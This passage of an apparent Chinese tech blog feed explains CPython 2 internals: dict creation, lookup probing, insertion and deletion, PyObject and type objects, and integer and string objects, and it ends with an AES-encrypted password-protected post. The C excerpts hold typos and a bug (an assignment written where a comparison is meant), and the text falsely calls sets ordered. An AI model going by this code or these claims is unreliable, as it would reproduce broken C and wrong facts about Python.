PyDictEntry ma_smalltable[PyDict_MINSIZE];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在定义的最后有一个给ma_smalltable的PyDictObject数组，这个数组意味着当创建一个PyDictObject对象时至少有PyDict_MINSIZE个entry被创建，这个值在dictobject.h中被设定为8，是通过大量实验得出的最佳值。而ma_table是关联对象的关键所在，他指向一个PyDictEntry集合的开始位置。当entry数小于8时，ma_table指向ma_smalltable.当entry数超过8时，Python会认为这是个大dict，将会申请额外的内存空间并将ma_table指向它。</p>
<h3 id="PyDictObject对象的创建"><a href="#PyDictObject对象的创建" class="headerlink" title="PyDictObject对象的创建"></a>PyDictObject对象的创建</h3><p>Python内部通过PyDict_New来创建一个新的Dict对象</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> PyDictEntry dictentry</span><br><span class="line"><span class="keyword">typedef</span> PyDictObject dictobject</span><br><span class="line"><span class="comment">// 将ma_table指向smalltable</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_NONZERO_DICT_SLOTS(mp) do&#123;    \</span></span><br><span class="line">	(mp)-&gt;ma_table = (mp)-&gt;ma_smalltable;  \</span><br><span class="line">    (mp)-&gt;ma_mask = PyDict_MINSIZE<span class="number">-1</span>;      \</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="number">0</span>)</span><br><span class="line"><span class="comment">// 将ma_smalltable清零，设置ma_size和ma_fill</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ENPTY_TO_MINSIZE(mp) do&#123;</span></span><br><span class="line">	<span class="built_in">memset</span>((mp)-&gt;ma_smalltable, <span class="number">0</span> ,<span class="keyword">sizeof</span>((mp)-&gt;ma_smalltable)); \</span><br><span class="line">    (mp)-&gt;ma_used = (mp)-&gt;ma_fill = <span class="number">0</span>;  \</span><br><span class="line">    INIT_NONZERO_DICT_SLOTS(mp);</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function">PyObject* <span class="title">PyDict_New</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">register</span> dictobject *mp;</span><br><span class="line">    <span class="comment">//自动创建dummy对象</span></span><br><span class="line">    <span class="keyword">if</span>(dummy == <span class="literal">NULL</span>)&#123;</span><br><span class="line">    	dummy = PyString_FromString(*&lt;dummy key&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(num_free_dicts)&#123;</span><br><span class="line">    <span class="comment">//使用缓冲池</span></span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="comment">//创建PyDictObject对象</span></span><br><span class="line">        mp = PyObject_GC_NEW(dictobject, &amp;PyDict_Type);</span><br><span class="line">        EMPTY_TO_MINSIZE(mp);</span><br><span class="line">    &#125;</span><br><span class="line">    mp-&gt;ma_lookup = lookdict_string;</span><br><span class="line">    <span class="keyword">return</span> (PyObject*) mp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从该定义可以看出dummy是一个PyStirngObject对象，它仅仅作为一个指示该entry被使用过的标志。ma_lookup制定了PyDictObject在entry集合中搜索某一个特定entry时需要进行的动作，其中包含了散列函数和发生二次冲突时探测函数的具体实现。</p>
<h3 id="Dict元素搜索"><a href="#Dict元素搜索" class="headerlink" title="Dict元素搜索"></a>Dict元素搜索</h3><p>Python提供两种搜索策略，一个是lookdict，一个是lookdict_string，因为使用string做键比较常用且重要，所以lookdict_string就陈伟给了默认采用的搜索策略略</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> dictentry* <span class="title">lookdict</span><span class="params">(dictobject *mp , PyObject *key, <span class="keyword">register</span> <span class="keyword">long</span> hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">register</span> <span class="keyword">size_t</span> i;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">size_t</span> perturb;</span><br><span class="line">    <span class="keyword">register</span> dictentry *freeslot;</span><br><span class="line">    dictentry *ep0 = mp-&gt;ma_table;</span><br><span class="line">    <span class="keyword">register</span> dictentry *ep;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//散列，定位冲突探测连的第一个entry</span></span><br><span class="line">    i = hash &amp; mask;</span><br><span class="line">    ep = &amp;ep0·[i];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//entry处于unused或entry中的key与带搜索的key匹配</span></span><br><span class="line">    <span class="keyword">if</span>（ep-&gt;me_key ==<span class="literal">NULL</span> || ep-&gt;me_key == key）</span><br><span class="line">    	<span class="keyword">return</span> ep;</span><br><span class="line">     </span><br><span class="line">     <span class="comment">//entry处于dummy态，设置freeslot</span></span><br><span class="line">     <span class="keyword">if</span>(ep-&gt;me_key == dummy)</span><br><span class="line">     	freeslot = ep;</span><br><span class="line">     <span class="keyword">else</span>&#123;</span><br><span class="line">     	<span class="comment">//检查active态entry</span></span><br><span class="line">        <span class="keyword">if</span>(ep-&gt;me_hash == hash)</span><br><span class="line">        &#123;</span><br><span class="line">     		startkey = ep-&gt;me_key;</span><br><span class="line">            cmp = PyObject_RichCompareBool(startkey,key,Py_EQ);</span><br><span class="line">            <span class="keyword">if</span>(cmp &gt; <span class="number">0</span>)</span><br><span class="line">            	<span class="keyword">return</span> ep;</span><br><span class="line">        &#125;</span><br><span class="line">        freeslot = <span class="literal">NULL</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里只列出了python对冲突链上的第一个entry进行的操作。PyDictObject中维护的entry是有限的，但是传入参数的key的hash值却不一定在这个范围内，这就要求lookdict将hash映射到某个entry上。python 采取的策略直接把hash值和mask做与操作。（这也是为什么这个变量命名微ma_mask而不是ma_size）</p>
<p>freeslot变量的作用是：如果探测连中某个位置上entry属于Dummy态，那么如果在这个序列搜索不成功，就会返回这个处于dummy态的entry，这是一个me_value为NULL，可以立即被使用的entry。</p>
<p>在Dict中相同这个概念包含两层含义 1.引用相同（两个符号引用的是内存同一个地址，这个由ep-&gt;me_key==key完成） 2.值相同（是说两个PyObject×指向了不同的内存地址的对象，但这两个对象的值相同，这个由ep-&gt;me_hash == hash + RichCompare联合完成）</p>
<ol>
<li>根据hash值获得entry索引，这是冲突探测连上第一个entry的索引</li>
<li>在两种情况下搜索结束：<ol>
<li>entry处于unsued态，搜索失败</li>
<li>e-&gt;me_key == key 表明entry的key与带搜索的key匹配，搜索成功</li>
</ol>
</li>
<li>若当前entyr处于dummy态，设置freeslot</li>
<li>检查active态entry中的key与待查找的key是否“值相同”，若成立搜索成功 </li>
</ol>
<p>如果冲突探测连上第一个entry的key与待查找的key不匹配，那么很自然的lookdict会沿着探测连一次比较<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">   <span class="comment">//便利冲突链，检查每一个entry</span></span><br><span class="line"><span class="keyword">for</span>(perturb = hash ;; perturb &gt;&gt;= PERTURB_SHIFT)&#123;</span><br><span class="line">   	<span class="comment">//寻找下一个entry</span></span><br><span class="line">       i = (i&lt;&lt;<span class="number">2</span>) + i +perturb +<span class="number">1</span>;</span><br><span class="line">       ep = &amp;ep0[i &amp; mask];</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//到达unused态的entry 搜索失败</span></span><br><span class="line">       <span class="keyword">if</span>(ep-&gt;me_key == <span class="literal">NULL</span>)</span><br><span class="line">       	<span class="keyword">return</span> freeslot = <span class="literal">NULL</span>? ep :freeslot</span><br><span class="line">       <span class="comment">//检查引用相同是否成立</span></span><br><span class="line">       <span class="keyword">if</span>(ep-&gt;me_key == key)</span><br><span class="line">       	<span class="keyword">return</span> ep;</span><br><span class="line">       <span class="keyword">if</span>(ep-&gt;me_hash == hash &amp;&amp; ep-&gt;me_key!=dummy)&#123;</span><br><span class="line">       	startkey = ep-&gt;me_key;</span><br><span class="line">           cmp = PyObject_RichCompareBool(startkey, key, py_EQ);</span><br><span class="line">           <span class="keyword">if</span>( cmp&gt;<span class="number">0</span> )</span><br><span class="line">           	<span class="keyword">return</span> ep;</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ep-&gt;me_key == dummy &amp;&amp; freeslot ==<span class="literal">NULL</span>)</span><br><span class="line">       	freeslot = ep;</span><br><span class="line">   &#125;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure></p>
<p>如果搜索成功，一定会返回一个有效的entry，如果搜索失败，会返回一个可被立即利用的entry</p>
<h3 id="Dict插入元素"><a href="#Dict插入元素" class="headerlink" title="Dict插入元素"></a>Dict插入元素</h3><pre><code>PydictObject对象中元素的插入动作建立在搜索的基础之上，理解了PyDictObject对象还搜索策略，对于插入动作很好理解。
</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertdict</span><span class="params">(<span class="keyword">register</span> dictobject *mp, PyObject *key, <span class="keyword">long</span> hash, PyObject *value)</span></span>&#123;</span><br><span class="line">	ep = mp-&gt;ma_loopup(mp, key ,hash);</span><br><span class="line">    <span class="comment">//搜索成功直接替换old——value</span></span><br><span class="line">    <span class="keyword">if</span>(ep-&gt;me_value != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    	old_value = ep-&gt;me_value;</span><br><span class="line">        ep-&gt;me_value = value;</span><br><span class="line">        py_DECREF(old_value);</span><br><span class="line">        py_DECREF(key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//搜索失败 完整的设置key hash value</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="keyword">if</span>(ep-&gt;me_key == <span class="literal">NULL</span>)</span><br><span class="line">        	mp-&gt;ma_fill++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        	Py_DECREF(ep-&gt;my_key)</span><br><span class="line">        ep-&gt;me_key = key;</span><br><span class="line">        ep-&gt;me_hash = hash;</span><br><span class="line">    	ep-&gt;me_value = value;</span><br><span class="line">        mp-&gt;ma_used++:</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的参数hash是在PyDict_SetItem函数中获得的，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">PyDict_SetItem</span><span class="params">(...)</span></span>&#123;</span><br><span class="line">	<span class="comment">//计算哈希值</span></span><br><span class="line">    <span class="keyword">if</span>(PyString_CheckExact(key))&#123;</span><br><span class="line">    	hash = ((PyStringObejct*)key)-&gt; ob_shash;</span><br><span class="line">        <span class="keyword">if</span>(hash ==<span class="number">-1</span>)</span><br><span class="line">        	hash =PyObejct_Hash(key);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	hash = PyObject_Hash(key);</span><br><span class="line">        <span class="keyword">if</span>(hash == <span class="number">-1</span>)</span><br><span class="line">        	reurn <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    insertdict(mp,keyhash,value)</span><br><span class="line">    <span class="comment">//必要时调整dict空间</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Dict删除元素"><a href="#Dict删除元素" class="headerlink" title="Dict删除元素"></a>Dict删除元素</h3><pre><code>与插入元素类似，先搜索entry，如果搜索失败，说明entry不存在，返回-1.。如果搜索成功则删除该entry维护的元素 ，把entry变成dummy状态。
</code></pre><h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><pre><code>集合Set与Dict的实现非常相似，同样不可以放入可变对象做key，惟一的区别是set只有key没有value。set是有序的，需要使用列表或元组做初始化
</code></pre><h2 id="效率相关"><a href="#效率相关" class="headerlink" title="效率相关"></a>效率相关</h2><p>关于python内置数据结构的一些方法的时间复杂度：</p>
<p><a href="http://www.orangecube.net/python-time-complexity" target="_blank" rel="noopener">http://www.orangecube.net/python-time-complexity</a></p>
]]></content>
      
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python内建对象]]></title>
      <url>/2017/07/01/Python/Python%E5%86%85%E5%BB%BA%E5%AF%B9%E8%B1%A1/</url>
      <content type="html"><![CDATA[<h2 id="Python对象类型初探"><a href="#Python对象类型初探" class="headerlink" title="Python对象类型初探"></a>Python对象类型初探</h2><p>首先要明白的是:<strong>在Python中，任何一个东西都是对象，而每个对象都对应一种类型</strong></p>
<a id="more"></a>
<p>对象类型的基石是PyObject，其定义为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">object</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> ob_refcnt; <span class="comment">//引用计数</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">ob_type</span>;</span> <span class="comment">//类型信息</span></span><br><span class="line">&#125;PyObject;</span><br></pre></td></tr></table></figure>
<p>其中ob_refcnt是计数引用，ob_type是一个指向_typeobject结构体的指针，这个结构体对应着Python内部的一种特殊对象，它是用来<strong>指定一个对象类型的类型对象</strong>，在PyObject的基础扩展，可以得到PyVarObject，来表示变长对象</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> ob_refcnt; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">ob_type</span>;</span></span><br><span class="line">  <span class="keyword">int</span> obsize;</span><br><span class="line">&#125;PyVarObject</span><br></pre></td></tr></table></figure>
<p>也就是说在python中任何一个对象都拥有相同的对象头，所以我们只需要一个PyObject<em> 指针就可以引用任意一个对象，可以很方便的实现<em>*多态机制</em></em>。</p>
<p>在PyObject中定义了每个Python对象都必须有的内容，初次之外还应该有一些额外的内存来放置其他内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  PyObject_HEAD <span class="comment">//这是PyObject头的宏定义</span></span><br><span class="line">  <span class="keyword">long</span> ob_ival;</span><br><span class="line">&#125;PyIntObject;</span><br></pre></td></tr></table></figure>
<p>同样，Python中的字符串对象，list，dict，等其他对象，都在PyObject之外保存了属于自己的特殊的信息</p>
<p>什么是类型对象？ </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span>&#123;</span></span><br><span class="line">  PyObject_VAR_HEAD</span><br><span class="line">  <span class="keyword">char</span> *tp_name;<span class="comment">//类型名</span></span><br><span class="line">  <span class="keyword">int</span> tp_basicsize,tp_itemsize;<span class="comment">//创建该类型对象时候分配内存空间的大小信息</span></span><br><span class="line">  </span><br><span class="line">  destrcutor tp_dealloc;</span><br><span class="line">  printfunc ty_prnt; <span class="comment">//与该类型对象关联的操作信息</span></span><br><span class="line">&#125;PyTypeObject;</span><br></pre></td></tr></table></figure>
<h2 id="Python中的整数对象"><a href="#Python中的整数对象" class="headerlink" title="Python中的整数对象"></a>Python中的整数对象</h2><h3 id="初识PyIntObject对象"><a href="#初识PyIntObject对象" class="headerlink" title="初识PyIntObject对象"></a>初识PyIntObject对象</h3><p>Python中整数的概念是通过PyIntObject对象来完成的。Python中的对象可以分为<strong>定长对象</strong>和<strong>变长对象</strong>，或者分为<strong>可变对象(mutable)</strong>和<strong>不可变对象(immutable)</strong>。</p>
<p>静态的整数对象的定义–PyIntObject</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  PyObject_HEAD</span><br><span class="line">  <span class="keyword">long</span> ob_ival;</span><br><span class="line">&#125;PyIntObject;</span><br></pre></td></tr></table></figure>
<p>对于Python中的对象，与对象相关的元信息实际上保存在与对象对应的类型对象中，对于PyIntObject，这个类型对象是PyInt_Type，PyInt_Type中保存了关于PyIntObject对象的丰富元信息，其中包括PyIntObject对象应该占用的内存大小、文档信息、支持的操作等。</p>
<blockquote>
<p>对象和类型对象关系？</p>
</blockquote>
<p>PyIntObject是一个immutable的对象，在加减法操作完成后原来参与操作的任何对象都没有发生改变，取而代之的是一个全新的PyIntObject对象</p>
<h2 id="Python中的字符串对象"><a href="#Python中的字符串对象" class="headerlink" title="Python中的字符串对象"></a>Python中的字符串对象</h2><p>在Python中字符串对象是通过PyStringObject实现的，这是一个拥有可变长度内存的对象</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  PyObject_VAR_HEAD</span><br><span class="line">  <span class="keyword">long</span> ob_shash;<span class="comment">// 缓存该对象的hash值，在dict中非常有用</span></span><br><span class="line">  <span class="keyword">int</span> ob_sstate;<span class="comment">// 标记该对象是否已经经过intern机制的护理</span></span><br><span class="line">  <span class="keyword">char</span> ob_sval[<span class="number">1</span>]; <span class="comment">//指向一段内存，这段内存保存着字符串对象所维护的字符串</span></span><br><span class="line">  <span class="comment">//这段内存的实际长度是由PyObject_VAR_HEAD中的ob_size来维护的</span></span><br><span class="line">&#125;PyStringObject;</span><br></pre></td></tr></table></figure>
<h3 id="PyStringObject效率相关"><a href="#PyStringObject效率相关" class="headerlink" title="PyStringObject效率相关"></a>PyStringObject效率相关</h3><p>Python对于字符串提供了利用+连接字符串的功能，但是这个功能效率非常低下。原因在于PyStringObject是不可变对象，这意味进行字符串连接实际上要新建一个PyStringObject对象然后进行内存申请和搬运工作，这严重影响Python的执行效率。官方的做法是利用PystringObejct对象的join操作来对存储在list或tuple的一组PyStringObject对象进行连接操作。（+操作每次都需要申请一次内存，join操作会先统计有多少个PyStringObject,只申请一次内存）</p>
]]></content>
      
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[我的大学]]></title>
      <url>/2017/06/29/Life/%E6%88%91%E7%9A%84%E5%A4%A7%E5%AD%A6/</url>
      <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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